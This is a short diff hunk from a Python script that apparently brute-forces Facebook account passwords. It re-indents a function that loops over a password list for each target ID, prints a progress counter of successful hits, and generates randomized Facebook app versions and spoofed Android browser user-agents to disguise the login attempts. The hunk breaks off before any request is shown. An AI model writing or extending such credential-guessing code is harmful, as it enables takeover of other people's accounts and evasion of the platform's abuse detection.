@@ -883,11 +883,11 @@ android_model1 = random.choice(['SM-M022G'])
 useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/{} Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))
 
 def m1(idf,pwv):
-global loop
-p = round(loop * 100 / lim, 2)
-sys.stdout.write(f'''\r\r\x1b[1;37m [Q_T_9] [{loop!s}] \x1b[1;37m[OK={len(oks)!s}] [{p!s}%] \x1b[1;37m''')
-sys.stdout.flush()
-for pas in passlist:
+ global loop
+ p = round(loop * 100 / lim, 2)
+ sys.stdout.write(f'''\r\r\x1b[1;37m [Q_T_9] [{loop!s}] \x1b[1;37m[OK={len(oks)!s}] [{p!s}%] \x1b[1;37m''')
+ sys.stdout.flush()
+ for pas in passlist:
             application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
             application_version_code = str(random.randint(0, 999999999))
             fbs = random.choice(fbks)
